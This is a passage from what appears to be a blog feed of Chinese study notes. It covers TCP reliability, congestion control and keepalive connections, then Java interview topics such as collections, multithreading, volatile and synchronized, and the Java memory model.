/>UDP：IP数据包大于1500字节，大于MTU。这个时候发送方的IP层就需要分片，吧数据包分成若干片，每一片都小于MTU。而接收方IP层则需要数据包的重组。由于UDP的特性，当某一片数据丢失时，接收方无法重组数据包，导致丢弃整个UDP数据包。</li><li>流量控制：当接收方来不及处理发送方的数据时，能通过滑动窗口，提示发送方降低发送的速率，防止包丢失。</li><li>拥塞控制：当网络拥塞时，通过拥塞窗口，减少数据的发送，防止包丢失。</li></ol><p><em>总结二：</em></p><ol><li>可靠传输：对于收到的请求，给出确认响应</li><li>超时重传</li><li>流量控制：让发送方的发送速率不要太快，要让接收方来得及接受。利用滑动窗口实现流量控制</li><li>拥塞控制：防止过多的数据注入到网络中，这样可以使网络中的路由器或链路不至过载</li><li>慢开始：TCP开始发送报文段时先设置拥塞窗口为1</li><li>拥塞避免：使拥塞窗口按线性规律增长</li><li>快重传：发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段，而不必继续等待为其设置的重传计时器到期</li><li>快恢复(与快重传配合使用)：当发送方连续收到三个重复确认时，就执行“乘法减小”算法，把慢开始门限减半。这是为了预防网络发生拥塞。请注意，接下来不执行慢开始算法。<br />由于发送方现在认为网络很可能没有发生拥塞(如果网络发生了严重的拥塞，就不会一连有好几个报文段连续达到接收方，就不会导致接收方连续发送重复确认)，因此与慢开始不同之处是现在不执行慢开始算法(即拥塞窗口现在不设置为1)，而是把它设置为慢开始门限减半后的数值，然后开始执行拥塞避免算法(“加法增大”)，使拥塞窗口缓慢地线性增长。</li></ol><h2 id="长连接与短连接"><a class="markdownIt-Anchor" href="#长连接与短连接"></a> 长连接与短连接</h2><h3 id="http协议和tcp协议"><a class="markdownIt-Anchor" href="#http协议和tcp协议"></a> HTTP协议和TCP协议</h3><p>HTTP的长连接和短连接本质上是TCP长连接和短连接。HTTP属于应用层协议，在传输层使用TCP协议，在网络层使用IP协议。IP协议主要解决网络路由和寻址问题，TCP协议主要解决如何在IP层之上可靠的传输数据包，使在网络上的另一端收到发端发出的所有包，并且顺序与发出顺序一致。TCP有可靠，面向连接的特点。</p><h3 id="http协议的长连接和短连接"><a class="markdownIt-Anchor" href="#http协议的长连接和短连接"></a> HTTP协议的长连接和短连接</h3><p>在HTTP/1.0中，默认使用的是短连接。也就是说，浏览器和服务器每进行一次HTTP操作，就建立一次连接，但任务结束就中断连接。如果客户端浏览器访问的某个HTML或其他类型的Web页中包含有其他的Web资源，如JavaScript文件、图像文件、CSS文件等；当浏览器没遇到这样一个Web资源，就会建立一个HTTP会话。</p><p>但从HTTP/1.1起，默认使用长连接，用以保持连接特性。使用长连接的HTTP协议，会在响应头加入如下代码：<code>Connection:keep-alive</code>。在使用长连接的情况下，当一个网页打开完成之后，客户端和服务端之间用于传输HTTP数据的TCP连接不会关闭，如果客户端再次访问这个服务器的网页，会继续使用这一条已经建立的连接。Keep-Alive不会永久保持连接，它有一个保持时间，可以在不同的服务器软件（如Apache）中设定这个事件。实现长连接要客户端和服务端都支持长连接。</p><p>HTTP协议的长连接和短连接，实质上是TCP协议的长连接和短连接。</p><h3 id="tcp长连接和短连接"><a class="markdownIt-Anchor" href="#tcp长连接和短连接"></a> TCP长连接和短连接</h3><p>我们模拟一下TCP短连接的情况，client向server发起连接请求，server接到请求，然后双方建立链接。client向server发送消息，server回应client，然后一次读写就完成了，这时候双方任何一个都可以发起close操作，不过一般都是client先发起close操作。为什么呢，一般的server不会回复完client后立即关闭连接的，当然不排除有特殊的情况。从上面的描述看，短连接一般只会在 client/server间传递一次读写操作。</p><p><strong>短连接的优点：管理起来比较方便，存在的连接都是有用的连接，不需要额外的控制手段。</strong></p><p>我们再模拟一下长连接的情况，client向server发起连接，server接受client连接，双方建立连接。client与server完成一次读写之后，它们之间的连接并不会主动关闭，后续的读写操作会继续使用这个链接。</p><p><strong>首先说一下TCP/IP详解上讲到的TCP保活功能，保活功能主要为服务器应用提供，服务器应用希望知道客户主机是否崩溃，从而可以代表客户使用资源。如果客户已经消失，使得服务器上保留一个半开放的连接，而服务器又在等待来自客户端的数据，则服务器将应远等待客户端的数据，保活功能就是试图在服务器端检测到这种半开放的连接。</strong></p><h3 id="长连接和短连接的生命周期"><a class="markdownIt-Anchor" href="#长连接和短连接的生命周期"></a> 长连接和短连接的生命周期</h3><p>短连接在建立连接后，完成一次读写就会自动关闭了。</p><p>正常情况下，一条TCP长连接建立后，只要双方不提出关闭请求并且不出现异常情况，这条连接是一直存在的，操作系统不会自动去关闭它，甚至经过物理网络拓扑的改变之后仍然可以使用。所以一条连接保持几天、几个月、几年或者更长时间都有可能，只要不出现异常情况或由用户（应用层）主动关闭。</p><p>在编程中，往往需要建立一条TCP连接，并且长时间处于连接状态。所谓的TCP长连接并没有确切的时间限制，而是说这条连接需要的时间比较长。</p><h3 id="怎样维护长连接或者检查中断"><a class="markdownIt-Anchor" href="#怎样维护长连接或者检查中断"></a> 怎样维护长连接或者检查中断</h3><ul><li><p>在应用层使用heartbeat来主动监测<br />对于实时性要求较高的网络通信程序，往往需要更加及时的获取已经中断的连接，从而进行及时的处理。但如果对方的连接异常中断，往往是不能及时的得到对方连接已经中断的信息，操作系统检测连接是否中断的时间间隔默认是比较长的，即便它能够检测到，但却不符合我们的实时性需求，所以需要我们进行手工去不断探测。</p></li><li><p>改变socket的keepalive选项，以使socket检查连接是否中断的时间间隔更小，以满足我们的及时性需求。有关的几个选项使用和解析如下：</p><ol><li><p>我们在检测对端以一种非优雅的方式断开连接的时候，可以设置SO_KEEPALIVE属性使得我们在2小时以后发现对方的TCP连接是否依然存在。用法如下:</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keepAlive &#x3D; 1；</span><br><span class="line">setsockopt(listenfd, SOL_SOCKET, SO_KEEPALIVE, (void*)&amp;keepAlive, sizeof(keepAlive));</span><br></pre></td></tr></table></figure></li><li><p>如果我们不想使用这么长的等待时间，可以修改内核关于网络方面的配置参数，也可设置SOCKET的TCP层（SOL_TCP）选项TCP_KEEPIDLE、TCP_KEEPINTVL和TCP_KEEPCNT。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TCP_KEEPIDLE：开始首次KeepAlive探测前的TCP空闭时间</span><br><span class="line">TCP_KEEPINTVL：两次KeepAlive探测间的时间间隔</span><br><span class="line">TCP_KEEPCNT：断开前的KeepAlive探测次数</span><br></pre></td></tr></table></figure><p>如果心搏函数要维护客户端的存活，即服务器必须每隔一段时间必须向客户段发送一定的数据，那么使用SO_KEEPALIVE是有很大的不足的。因为SO_KEEPALIVE选项指&quot;此套接口的任一方向都没有数据交换&quot;。在Linux2.6系列上，上面话的理解是只要打开SO_KEEPALIVE选项的套接口端检测到数据发送或者数据接受就认为是数据交换。因此在这种情况下使用 SO_KEEPALIVE选项。</p><p>检测对方是否非正常连接是完全没有作用的，在每隔一段时间发包的情况， keep-alive的包是不可能被发送的。上层程序在非正常断开的情况下是可以正常发送包到缓冲区的。非正常端开的情况是指服务器没有收到&quot;FIN&quot; 或者 &quot;RST&quot;包。</p></li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java总结</title>
      <link href="/java-summary/"/>
      <url>/java-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="java的四个特性抽象-封装-继承-多态对多态的理解多态的实现方式"><a class="markdownIt-Anchor" href="#java的四个特性抽象-封装-继承-多态对多态的理解多态的实现方式"></a> Java的四个特性（抽象、封装、继承、多态），对多态的理解（多态的实现方式）</h2><ul><li><p>抽象：抽象是将一类对象的共同特征总结出来构造类的过程。包括数据抽象和行为抽象两个方面。抽象只关注对象有哪些属性和行为，并不关注这些行为的细节是什么。</p></li><li><p>继承：继承是从已有类得到继承信息创建新类的过程。提供继承信息的类被称为父类（超类、基类）；得到继承信息的类被称为子类（派生类），继承让变化中的软件系统有了一定的延续性，同时继承也是封装程序中可变因素的重要手段。</p></li><li><p>封装：通常认为封装是将数据与操作数据的方法绑定起来，对数据的访问只能通过已定义的接口。面向对象的本质就是将现实世界描绘成一系列完全自治、封闭的对象。我们在类中编写的方法是对实现细节的一种封装；我们编写的一个类就是对数据和数据操作的封装。封装就是隐藏一切可隐藏的东西，只向外提供简单的编程接口。</p></li><li><p>多态</p><ul><li>方法重载（overload）实现的是编译时的多态性（也成为前向绑定）</li><li>方法重写（overwrite）实现的是运行时的多态性（也成为后向绑定）</li><li>多态的实现方式：方法重写，子类继承父类并重写父类中已有的或抽象的方法；对象构造，用父类型引用子类型对象，这样同样的引用调用同样的方法就会根据子类对象的不同而表现出不同的行为</li><li>举例：有两种客户：订购客户和卖方客户，两个客户都可以登录系统，他们有相同的方法login，但登录之后他们会进入不同的页面，也就是在登录后有不同的操作行为。两种客户都继承父类的Login方法，但对于不同的对象，拥有不同的操作。</li></ul></li></ul><h2 id="面向对象和面向过程的区别"><a class="markdownIt-Anchor" href="#面向对象和面向过程的区别"></a> 面向对象和面向过程的区别？</h2><ul><li><p>面向过程就像是一个细心的管家，事无具细的都要考虑到。而面向对象就像是一个家用电器，你只需要知道他的功能，不需要知道他的工作原理</p></li><li><p>面向过程是一种以时间为中心的编程思想，就是分析出解决问题所需的步骤，然后用函数把这些步骤实现，并按顺序调用。面向对象是以“对象”为中心的编程思想</p></li><li><p>举例：汽车发送、汽车到站</p><ul><li>对于面向过程来说，这是两个事件，面向过程编程我们关心的是事件，而不是汽车本身。针对上述过程，形成两个函数，依次调用</li><li>对于面向对象来说，我们关心的是汽车这类对象，两个事件只是这类对象所具有的行为。而且对于这两个行为没有顺序要求</li></ul></li></ul><h2 id="重载与重写"><a class="markdownIt-Anchor" href="#重载与重写"></a> 重载与重写</h2><ul><li><p>重载：重载发生在同一个类中，同名的方法如果有不同的参数列表（参数类型、参数个数或者两者都不同）则视为重载</p></li><li><p>重写：重写发生在子类与父类之间，重写要求子类重写方法与父类被重写方法具有相同的返回参数，比父类方法更好访问，不能比父类被重写方法声明更多的异常（里氏代换原则），根据不同的子类对象确定调用哪个对象</p></li></ul><h2 id="面向对象开发的六个基本准则单一职责-开放封闭-里氏替换-依赖倒置-合成聚合复用-接口隔离迪米特法则"><a class="markdownIt-Anchor" href="#面向对象开发的六个基本准则单一职责-开放封闭-里氏替换-依赖倒置-合成聚合复用-接口隔离迪米特法则"></a> 面向对象开发的六个基本准则（单一职责、开放封闭、里氏替换、依赖倒置、合成聚合复用、接口隔离），迪米特法则</h2><ul><li><p>单一职责：一个类只能它该做的事情（高内聚），在面向对象中，如果只让一个类完成它该做的事，而不涉及与它无关的领域就是践行了高内聚的原则，这个类就是单一职责</p></li><li><p>开放封闭：软件实体应当对扩展开放，对修改关闭。要做到开闭有两点：抽象是关键，一个系统如果没有抽象类或者接口系统就没有扩展点；封装可变性，将系统中可变因素封装在一个继承结构中，如果多个可变因素混杂在一起，系统将复杂而混乱</p></li><li><p>里氏替换：任何时候都可以用子类替换父类，子类一定是增加了父类的能力而不是减少，因为子类比父类的能力更多，把能力多的对象当成能力少的对象来用没有问题</p></li><li><p>依赖倒置：面向接口编程（声明方法的参数类型、方法返回类型，变量的引用类型要尽量使用抽象类型而不是具体类型，因为抽象类型可以被其子类型所替代）</p></li><li><p>合成聚合复用：优先使用聚合或合成关系复用代码</p></li><li><p>接口隔离：接口不要大而全，要小而专，一个接口只应该描述一种能力，接口也应该是高内聚的</p></li></ul><p>迪米特法则：又称为最少知识原则，一个对象应当对其他对象有尽可能少的了解</p><h2 id="static与final的区别"><a class="markdownIt-Anchor" href="#static与final的区别"></a> static与final的区别</h2><p>static：</p><ul><li>修饰变量：静态变量随着类加载时完成初始化，内存中只有一个，且JVM只会为它分配一次内存，所有类共享静态变量</li><li>修饰方法：在类加载的时候就存在，不依赖任何实例；static方法必须实现，不能用abstract修饰</li><li>修饰代码块：在类加载完成后就会执行代码块中的内容</li><li>父类静态代码块-&gt;子类静态代码块-&gt;父类非静态代码块-&gt;父类构造方法-&gt;子类非静态代码块-&gt;子类构造方法</li></ul><p>final：</p><ul><li>修饰变量<ul><li>编译期常量：类加载的过程完成初始化，编译后带入到任何计算式中，只能是基本类型</li><li>运行时常量：基本数据类型或引用数据类型，引用不可变，但引用的对象内容可变</li></ul></li><li>修饰方法：不能被继承，不能被子类修改</li><li>修饰类：不能被继承</li><li>修饰新参：final形参不可变</li></ul><h2 id="hashmap和hashtable的区别hashmap中的key可以是任何对象或数据类型吗"><a class="markdownIt-Anchor" href="#hashmap和hashtable的区别hashmap中的key可以是任何对象或数据类型吗"></a> HashMap和Hashtable的区别，HashMap中的key可以是任何对象或数据类型吗？</h2><p>区别：</p><ul><li>Hashtable的方法是同步的，HashMap未经同步，所以在多线程环境下要手动同步HashMap，这个区别就相当于Vector和ArrayList</li><li>Hashtable不允许使用null（key和value都不可以），HashMap允许null值（key只能有一个null值，value没有限制）</li><li>两者的遍历方式大同小异，Hashtable仅仅比HashMap多一个elements方法<br />Hashtable和HashMap都能通过values()方法返回一个Collection，然后遍历<br />两者也都可以通过entrySet()返回一个Set，然后遍历</li><li>Hashtable使用Enumeration，HashMap使用Iterator</li><li>哈希值计算方法不同，hashtable直接使用对象的hashCode，hashMap重新计算hash值，而且用于代替求模</li><li>Hashtable的hash数组大小是11，增加方式是old*2+1，hashMap的默认大小是16，而且一定是2的指数</li><li>hashtable是基于Dictionary，hashMap是基于AbstractMap类</li></ul><p>HashMap的key可以为null，但不可以为可变对象。如果是可变对象时，对象的属性改变，则对象的hashCode也进行了相应的改变，导致下次无法查找到已存在Map的数据。</p><p>如果可变对象被用作HashMap的键时，在改变对象的状态时，不要再改变其哈希值，我们只需要保证成员变量的改变能保证该对象的哈希值不变即可。</p><p>hashtable是线程安全的，其实是在对应的方法添加了synchronized关键字进行修饰，由于在执行此方法的时候需要获得对象锁，则执行起来比较慢。所以可以使用concurrentHashMap</p><h2 id="hashmap与concurrenthashmap"><a class="markdownIt-Anchor" href="#hashmap与concurrenthashmap"></a> HashMap与concurrentHashMap</h2><ol><li><p>区别<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/HashMap%E4%B8%8EconcurrentHashMap%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="HashMap与concurrentHashMap的区别" /></p></li><li><p>concurrentHashMap线程安全吗，如何保证线程安全？</p><ul><li><p>hashtable容器在竞争激烈的并发环境下表现出效率低下的原因是所有访问hashtable的线程都必须竞争同一把锁，当容器中有多把锁时，每一把锁用于锁住容器中的一部分数据，那么当多线程访问容器内不同数据段的数据时，线程间不会存在锁竞争，从而提高了并发访问的效率，这也是concurrentHashMap采用的锁分段技术，当一个线程访问其中一个段的数据时，其他段的数据也能被其他线程所访问</p></li><li><p>get的高效之处：get过程不需要加锁，除非读到的值是空的才需要加锁重读<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/concurrentHashMap%E7%9A%84get%E6%96%B9%E6%B3%95%E9%AB%98%E6%95%88%E4%B9%8B%E5%A4%84.png" alt="concurrentHashMap的get方法高效之处" /></p></li><li><p>put方法首先定位到segment，然后在segment里进行插入操作<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/concurrentHashMap%E7%9A%84put%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4.png" alt="concurrentHashMap的put操作步骤" /></p></li></ul></li></ol><h2 id="string-stringbuffer-stringbuilder"><a class="markdownIt-Anchor" href="#string-stringbuffer-stringbuilder"></a> String、StringBuffer、StringBuilder</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/String%E3%80%81StringBuffer%E3%80%81StringBuilder.png" alt="String、StringBuffer、StringBuilder" /></p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/String%E7%9A%84%E4%B8%8D%E5%8F%98%E6%80%A7.png" alt="String的不变性" /></p><h2 id="string重写了object的hashcode和tostring重写equals不重写hashcode有什么问题"><a class="markdownIt-Anchor" href="#string重写了object的hashcode和tostring重写equals不重写hashcode有什么问题"></a> String重写了Object的hashCode和toString，重写equals()不重写hashCode()有什么问题？</h2><ul><li><p>当equals方法被重写，通常需要重写hashCode方法，以保证两个相等的对象必须有相同的hashCode</p><ul><li>object1.equals(object2)时为true，则object1.hashCode()==object2.hashCode()也为true</li><li>object1.hashCode()==object2.hashCode()为false，则 object1.equals(object2)一定为false</li><li>object1.hashCode()==object2.hashCode()为true，则object1.equals(object2)状态不确定</li></ul></li><li><p>在存储散列集合(如Set)时，如果原对象.equals(新对象)，但如果没有对hashCode重写，即两个对象拥有不同的hashCode，则在集合中会存储两个值相同的对象，从而导致混淆。<strong>因此，重写equals方法时，必须重写hashCode方法</strong></p></li></ul><h2 id="java序列化"><a class="markdownIt-Anchor" href="#java序列化"></a> Java序列化</h2><ol><li><p>定义：将那些实现了Serializable接口的对象转换成一个字节序列，并能够在以后将这个字节序列完全恢复到原来的对象，序列化可以弥补不同操作系统之间的差异</p></li><li><p>作用</p><ul><li>Java远程方法调用</li><li>对JavaBeans进行序列化</li></ul></li><li><p>序列化与反序列化<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.png" alt="序列化与反序列化" /></p></li></ol><p><em>注意事项：</em></p><ul><li>被static修饰的属性不会被序列化</li><li>对象的类名、属性都会被序列化，但是方法不会被序列化</li><li>要保证对象所在的类的属性可以被序列化</li><li>当通过网络、文件进行序列化时，必须按照写入的顺序读取对象</li><li>反序列化时必须有序列化对象时的class文件</li><li>最好显示的声明serializableID，因为在不同的JVM时，默认生成的serializableID不同，可能导致反序列化失败</li></ul><h2 id="多线程"><a class="markdownIt-Anchor" href="#多线程"></a> 多线程</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B.png" alt="多线程" /></p><p><em>线程安全</em></p><ul><li>定义：某个类的行为与其规范一致；不管多个线程是怎样的执行顺序和优先级，或是wait、sleep、join等，如果一个类在多线程访问下都正常，并且不需要额外的同步处理和协调，那么这就是线程安全。</li><li>如何保证线程安全：对变量使用volitate；对程序段进行加锁（synchronized、lock）</li><li>注意：非线程安全的集合可以在多线程中使用，但是不能用作多个线程共享的属性，只能作为某个线程独享的属性</li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%85%B1%E7%94%A8%E4%B8%80%E4%B8%AA%E5%8F%98%E9%87%8F.png" alt="多线程共用一个变量" /></p><h2 id="线程池"><a class="markdownIt-Anchor" href="#线程池"></a> 线程池</h2><p>定义：实现先创建若干个可执行的线程放入一个容器（池）中，当需要的时候，不用自行创建只需要从容器中获取，使用完毕后不需要销毁而是放入到容器中，从而减少创建和销毁线程对象的开销。</p><p><strong>设计线程池</strong><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%88%9B%E5%BB%BA%E7%BA%BF%E7%A8%8B%E6%B1%A0.png" alt="创建线程池" /></p><h2 id="volatile关键字与synchronized的区别"><a class="markdownIt-Anchor" href="#volatile关键字与synchronized的区别"></a> volatile关键字与synchronized的区别</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E5%8C%BA%E5%88%AB.png" alt="区别" /></p><h2 id="sleep与wait"><a class="markdownIt-Anchor" href="#sleep与wait"></a> sleep()与wait()</h2><ul><li>sleep是Thread类的方法</li><li>wait是Object类的方法</li><li>区别：<ul><li>sleep()方法（休眠）是线程类（Thread）的静态方法，调用此方法会让当前线程暂停执行指定的时间，将执行机会（CPU）让给其他线程，但是对象的锁依然保持，因此休眠时间结束后会自动恢复（线程回到就绪状态）</li><li>wait()是object类的方法，调用对象的wait()方法导致当前线程放弃对象的锁（线程暂停执行），进入对象的等待池（wait pool），只有调用对象的notify()方法（或notifyAll()方法）时才能唤醒等待池中的线程进入等锁池（lock pool），如果线程重新获得对象的锁就可以进入就绪状态</li></ul></li></ul><h2 id="synchronized与lock"><a class="markdownIt-Anchor" href="#synchronized与lock"></a> synchronized与lock</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/synchronized%E4%B8%8Elock%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="synchronized与lock的区别" /></p><p>synchronized与static synchronized的区别：</p><ul><li>synchronized是对类的当前实例进行加锁，防止其他线程同时访问该类的该实例的所有synchronized锁，同一个类的不同实例之间没有这种约束</li><li>static synchronized是控制类的所有实例的访问，限制线程同时访问JVM中该类的所有实例同时访问对应的代码块</li></ul><h2 id="异常"><a class="markdownIt-Anchor" href="#异常"></a> 异常</h2><ul><li>Throwable是Java语言中所有错误和异常的超类，它有两个子类：<code>Error</code>和<code>Exception</code></li><li>异常种类<ul><li>Error：错误，是程序无法处理的，如OutOfMemeryError、ThreadDeath等，这种情况下交由JVM处理，一般会选择终止线程</li><li>Exception：程序可以处理的异常，它又分为<code>CheckedException</code>（受检异常）和<code>UnCheckedException</code>（不受检异常）<ul><li><code>CheckedException</code>：发生在编译阶段，必须使用<code>try...catch...</code>或者<code>throws</code>，否则编译不通过。</li><li><code>UnCheckedException</code>：发生在运行期，一般由程序的逻辑问题引起。</li></ul></li></ul></li></ul><h2 id="java中的nio-bio-aio分别是什么"><a class="markdownIt-Anchor" href="#java中的nio-bio-aio分别是什么"></a> Java中的NIO、BIO、AIO分别是什么？</h2><ol><li><p>BIO</p><ul><li>同步并阻塞，服务器实现模式为<code>一个连接一个线程</code>，即客户端有请求时服务器端就需要启动一个线程进行处理，如果这个连接不做任何事情就会造成不必要的线程开销，可以通过线程池机制来改善</li><li>BIO方式适用于<code>连接数目比较小且固定的架构</code>，这种方式对服务器资源要求比较高，并发局限于应用中</li></ul></li><li><p>NIO</p><ul><li>同步非阻塞，服务器实现模式为<code>一个请求一个线程</code>，即客户端发送的连接请求都会注册到多路复用器上，多路复用器轮询到连接有I/O请求时，才启动一个线程进行处理</li><li>NIO方式适用于<code>连接数多且连接比较短的架构</code>，比如聊天服务器，并发局限于应用中</li></ul></li><li><p>AIO</p><ul><li>异步非阻塞，服务器实现模式为<code>一个有效请求一个线程</code>，客户端的I/O请求都是由OS先完成了再通知服务器应用去启动线程进行处理</li><li>AIO方式适用于<code>连接数目多且连接比较长的架构</code>，比如相册服务器，充分调用OS参与并发操作</li></ul></li></ol><h2 id="java内存模型java-memory-modeljmm"><a class="markdownIt-Anchor" href="#java内存模型java-memory-modeljmm"></a> Java内存模型（Java Memory model，JMM）</h2><p>对于并发编程，有两个关键问题：线程之间的<strong>通信和同步</strong></p><h3 id="线程之间的通信"><a class="markdownIt-Anchor" href="#线程之间的通信"></a> 线程之间的通信</h3><p>线程的通信是指线程之间以何种机制来交换信息。在命令式编程中，线程之间的通信机制有两种<strong>共享内存和消息传递。</strong><br />典型的共享内存通信方式就是通过<strong>共享对象</strong>来进行通信。典型的消息传递方式就是<strong>wait()和notify()。</strong></p><h3 id="线程之间的同步"><a class="markdownIt-Anchor" href="#线程之间的同步"></a> 线程之间的同步</h3><p>同步是指程序用于控制不同线程之间操作发生相对顺序的机制。<br />在共享内存并发模型里，同步是显式进行的。程序必须显式指定某个方法或某段代码需要在线程之间互斥执行。<br />在消息传递的并发模型里，由于消息的发送必须在消息的接收之前，因此同步是隐式进行的。</p><h3 id="java的并发采用的是共享内存模型"><a class="markdownIt-Anchor" href="#java的并发采用的是共享内存模型"></a> Java的并发采用的是共享内存模型</h3><p>JMM决定一个线程对共享变量的写入何时对另一个线程可见。从抽象的角度来讲，JMM定义了线程和主内存之间的抽象关系：**线程之间的共享变量存储在主内存中，每个线程都有一个私有的本地内存，本地内存中存储了该线程以读/写共享变量的副本。**本地内存是JMM的一个抽象概念，并不真实存在。</p><p><em>线程之间的通信方式：首先，线程A把本地内存A中更新过的共享变量刷新到主内存中。然后，线程B到主内存中去读取线程A之前已更新过的共享变量。</em></p><p>从整体来看，这两个步骤实质上是线程A在向线程B发送消息，而且这个通信过程必须要经过主内存。JMM通过控制主内存与每个线程的本地内存之间的交互，来为Java程序员提供<strong>内存可见性保证</strong>。</p><h3 id="jvm对java内存模型的实现"><a class="markdownIt-Anchor" href="#jvm对java内存模型的实现"></a> JVM对Java内存模型的实现</h3><p>在JVM内部，Java内存模型把内存分成了两个部分：线程栈区和堆区。下图展示了Java内存模型在JVM中的逻辑视图：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20160921182837697.jpg" alt="" /></p><p>JVM中运行的每个线程都拥有自己的线程栈，线程栈包括了当前线程执行的方法调用相关信息，我们也把它称作调用栈。随着代码的执行，调用栈会不断的变化。</p><p><strong>线程栈</strong>还包含了当前方法的所有本地变量信息。一个线程只能读取自己的线程栈，也就是说，**线程中的本地变量对其他线程是不可见的。**即使两个线程执行的是同一段代码，它们也会各自在自己的线程栈创建本地变量，因此，<strong>每个线程中的本地变量都有自己的版本。</strong><br />所有原始类型（boolean、byte、short、int、long、char、float、double）的本地变量都直接保存在线程栈中，对于它们的值各个线程都相互独立。对于原始类型的本地变量，一个线程可以传递一个副本给另一个线程，当它们之间是无法共享的。</p><p><strong>堆区</strong>包含了Java应用创建的所有对象信息，不管对象是哪个线程创建的，其中的对象包括原始类型的封装类（如Byte、Integer、Long等）。不管对象是属于一个成员变量还是方法中的本地变量，它都会被存储在堆区。</p><ul><li>一个本地变量如果是原始类型，那么它会被完全存储到栈区。</li><li>一个本地变量也有可能是一个对象的引用，这种情况下，这个本地引用会被存储到栈中，但是对象本身仍然存储在堆区。</li><li>对于一个对象的成员方法，这些方法中包含本地变量，仍需要存储在栈区，即使它们所属的对象在堆区。</li><li>对于一个对象的成员变量，不管它是原始类型还是包装类型，都会被存储到堆区。</li><li>Static类型的变量以及类本身相关信息都会随着类本身存储在堆区。</li></ul><p>堆中的对象可以被多线程共享。如果一个线程获得一个对象的应用，它便可访问这个对象的成员变量。如果两个线程同时调用了同一个对象的同一个方法，那么这两个线程便可同时访问这个对象的成员变量，但是对于本地变量，每个线程都会拷贝一份到自己的线程栈中。</p><p>下图是上面的全部过程：<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/20160921182948601.jpg" alt="" /></p><h3 id="共享对象的可见性与竞争现象"><a class="markdownIt-Anchor" href="#共享对象的可见性与竞争现象"></a> 共享对象的可见性与竞争现象</h3><p>volatile关键字可以保证变量会直接从主存读取，而对变量的更新也会直接写到主存。volatile原理是基于CPU内存屏障指令实现的。<br />synchronized代码块可以保证同一个时刻只能有一个线程进入代码竞争区，synchronized代码块也能保证代码块中所有变量都将会从主存中读，当线程退出代码块时，对所有变量的更新将会flush到主存，不管这些变量是不是volatile类型的。</p><h3 id="volatile和synchronized的区别"><a class="markdownIt-Anchor" href="#volatile和synchronized的区别"></a> volatile和synchronized的区别</h3><p>首先理解线程安全的两个方面：<strong>执行控制和内存可见</strong>。<br />执行控制的目的是控制代码执行顺序及是否可以并发执行。<br />内存可见指的是线程执行结果在内存中对其他线程的可见性。根据Java内存模型的实现，线程在具体执行时，会先拷贝主存数据到线程本地（CPU缓存），操作完成后再把结果从线程本地刷到主存。</p><p><strong>synchronized关键字解决的是执行控制的问题</strong>，它会阻止其他线程获得当前对象的监控锁，这样使得当前被synchronized修饰的代码块无法被其他线程访问，也就无法并发执行。更为重要的是，synchronized还会创建<strong>内存屏障</strong>，内存屏障指令保证了所有CPU操作结果都会刷新到主存中，从而保证了内存可见性，<strong>同时也使得先获得这个锁的线程都happens-before与随后获得这个锁的线程。</strong></p><p>volatile关键字解决的是内存可见的问题，该关键字会使得被修饰的变量读写都会直接刷新到主存中，这样就保证了内存可见。<strong>该种方式可以保证内存可见性但是对读取没有要求的需求中。</strong></p><blockquote><p>使用volatile仅能实现对原始变量（如short、boolean、int等）操作的原子性，但是不能保证复合操作的原子性。例如，对于i++，实际上是由多个原子操作组成，如果使用多个线程去操作i++，则只能保证他们所操作的变量i在同一块内存区域，但是存在写入脏数据的情况。</p></blockquote><p><strong>使用volatile关键字要满足以下条件：</strong></p><ul><li>对变量的写入操作不依赖与变量的当前值，或者可以确保只有单个线程在操作变量</li><li>该变量没有包含在具有其他变量的不变式中</li></ul><p><strong>总结如下：</strong><br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/volatile%E4%B8%8Esynchronized%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="volatile与synchronized的区别" /></p><h3 id="java内存模型的基础原理"><a class="markdownIt-Anchor" href="#java内存模型的基础原理"></a> Java内存模型的基础原理</h3><ul><li>指令重排序：<br />为了提高程序的执行性能，编译器和处理器都会对指令进行重排序，但是JMM确保在不同的编译器和处理器平台下，通过插入指定类型的内存屏障来禁止编译器重排序和处理器重排序，为上层提供一致的内存可见性保证。</li></ul><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/%E6%8C%87%E4%BB%A4%E5%BA%8F%E5%88%97%E7%9A%84%E9%87%8D%E6%8E%92%E5%BA%8F.png" alt="指令序列的重排序" /></p><ul><li>数据依赖性：<br 